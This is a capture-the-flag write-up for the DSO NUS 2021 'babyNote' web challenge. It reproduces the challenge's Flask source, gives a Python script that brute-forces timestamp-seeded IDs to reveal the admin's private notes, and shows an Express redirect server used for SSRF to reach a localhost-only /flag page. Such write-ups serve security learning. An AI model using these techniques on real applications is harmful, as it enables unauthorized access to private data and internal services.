---
date: 2021-03-06 10:30 PM UTC
title: DSO NUS 2021 CTF - babyNote (Web)
description: Too many seeds close together are bad for the plants
tags:
  - ctf
  - dso-nus-ctf
  - web
---

This was a rather interesting challenge, as initally I did not see any vulnerabilities, and thought to rely on guesswork. But I managed to solve it after trying random things.

The challenge presents us with a link and a truncated copy of the source code.

```py
import string
import random
import time
import datetime
from flask import render_template, redirect, url_for, request, session, Flask
from functools import wraps
from exts import db
from config import Config
from models import User, Note
from forms import CreateNoteForm
from utils import *

app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kws):
            if not session.get("username"):
               return redirect(url_for('index'))
            return f(*args, **kws)
    return decorated_function


def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


@app.route('/')
@app.route('/index')
def index():
    results = Note.query.filter_by(prv='False').limit(100).all()
    notes = []
    for x in results:
        note = {}
        note['title'] = x.title
        note['note_id'] = x.note_id
        notes.append(note)

    return render_template('index.html', notes=notes)


@app.route('/logout')
@login_required
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))


@app.route('/create_note', methods=['GET', 'POST'])
def create_note():
    try:
        form = CreateNoteForm()
        if request.method == "POST":
            username = form.username.data
            title = form.title.data
            text = form.body.data
            prv = str(form.private.data)
            user = User.query.filter_by(username=username).first()

            if user:
                user_id = user.user_id
            else:
                timestamp = round(time.time(), 4)

                random.seed(timestamp)
                user_id = get_random_id()

                user = User(username=username, user_id=user_id)
                db.session.add(user)
                db.session.commit()
                session['username'] = username

            timestamp = round(time.time(), 4)


            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')

            random.seed(user_id + post_at)
            note_id = get_random_id()


            note = Note(user_id=user_id, note_id=note_id,
                        title=title, text=text,
                        prv=prv, post_at=post_at)
            db.session.add(note)
            db.session.commit()
            return redirect(url_for('index'))

        else:
            return render_template("create.html", form=form)
    except Exception as e:
        pass


@app.route('/my_notes')
def my_notes():
    if session.get('username'):
        username = session['username']
        user_id = User.query.filter_by(username=username).first().user_id
    else:
        user_id = request.args.get('id')
        if not user_id:
            return redirect(url_for('index'))

    results = Note.query.filter_by(user_id=user_id).limit(100).all()
    notes = []
    for x in results:
        note = {}
        note['title'] = x.title
        note['note_id'] = x.note_id
        notes.append(note)

    return render_template("my_notes.html", notes=notes)


@app.route('/view/<_id>')
def view(_id):
    note = Note.query.filter_by(note_id=_id).first()
    user_id = note.user_id
    username = User.query.filter_by(user_id=user_id).first().username
    data = {
        'post_at': note.post_at,
        'title': note.title,
        'text': note.text,
        'username': username
    }
    return render_template('note.htm
```

## Initial Analysis & Exploration

I managed to find some suspicious segments:
1. Getting notes by `user_id` (present in source but not in website)
2. Getting `/flag` (present in website but not in source)
3. We can specifiy the username that the `note` belongs to during `create_note`, even if it is not ourselves.

Visiting the `/flag` page, we see that we have to be `localhost`? Which is a funny check to do.

We also note that the `note_id` is based on a random string generated from the seed of the `user_id` and the current date and time, but the seconds do not matter.
Immediately, this is suspicious! This means that two notes will have the same `note_id` if they are created in the same minute. I tried doing that using the website and managed to replicate this behavior.

However, I couldn't proceed more than this, until my next try.

## Trying random things

```py{17,30}
@app.route('/create_note', methods=['GET', 'POST'])
def create_note():
    try:
        form = CreateNoteForm()
        if request.method == "POST":
            username = form.username.data
            title = form.title.data
            text = form.body.data
            prv = str(form.private.data)
            user = User.query.filter_by(username=username).first()

            if user:
                user_id = user.user_id
            else:
                timestamp = round(time.time(), 4)

                random.seed(timestamp)
                user_id = get_random_id()

                user = User(username=username, user_id=user_id)
                db.session.add(user)
                db.session.commit()
                session['username'] = username

            timestamp = round(time.time(), 4)


            post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')

            random.seed(user_id + post_at)
            note_id = get_random_id()


            note = Note(user_id=user_id, note_id=note_id,
                        title=title, text=text,
                        prv=prv, post_at=post_at)
            db.session.add(note)
            db.session.commit()
            return redirect(url_for('index'))

        else:
            return render_template("create.html", form=form)
    except Exception as e:
        pass
```
For the first post of a user, his `user_id` is based of the current system time, rounded off to 4 decimal places. Then, the `note_id` is based of his `user_id` and the current system time, but formatted to only minute-accuracy (`post_at`). The `user_id` is not known to us, but all the posts' `note_id` and `post_at` is known.

Thus, for the initial post of a user, knowing the `post_at`, we can brute force the exact time of creation in 4 decimal places to generate a `user_id`. We can verify if it is correct by generating the `note_id` from this `user_id` and `post_at` and matching it with the actual `note_id`.

```py
import string
import random
import time
from dateutil.parser import parse
from datetime import datetime
import pytz

# From the app.py
def get_random_id():
    alphabet = list(string.ascii_lowercase + string.digits)
    return ''.join([random.choice(alphabet) for _ in range(32)])


def gen_userid(time):
    random.seed(time)
    return get_random_id()

target_time_str = "2021-01-15 02:31 UTC"
target_id = "6mxesnyaqdtaj7tipr7enopo89c40msr"

target_time = datetime.strptime(target_time_str, "%Y-%m-%d %H:%M UTC")
target_time = target_time.replace(tzinfo=pytz.UTC)
target_time = target_time.timestamp()

for i in range(60 * 10000 +1):
    t = target_time + (i/10000)
    random.seed(t)
    user_id = get_random_id()

    random.seed(user_id + target_time_str)
    nid = get_random_id()
    if nid == target_id:
        print(user_id)
        print("SUCCESS")
        break
    print("ATTEMPT: "+str(t))
```

This is the script to do so. Trying it with the `admin`'s first post, we can now view his notes, including his private notes, one of which looks very suspicious.

## Random Protection?
That link is a webpage where can enter a url then get the content of the webpage as text. Trying it with the obvious /flag endpoint, we just get the same respones as if we visited the webpage and viewed the source. Same with using `http://localhost/flag` instead of the full url. But an external webserver giving redirects works:
```js
const app = require('express')()
app.get("/", (req, res) => {
    res.redirect("http://localhost/flag");
});
app.listen(3000);
```
Using the URL `http://<myip>/` works and gets me the flag printed. Ah, that's better.

## Conclusion
This challenge had a satisying trick to it, so I enjoyed it. Unfortunately, I did not take any pictures, and I only have my python bruteforce script, so this writeup is quite bland. Later on, it was revealed that it was copied from another challenge with added restrictions ._., so I was a bit disappointed.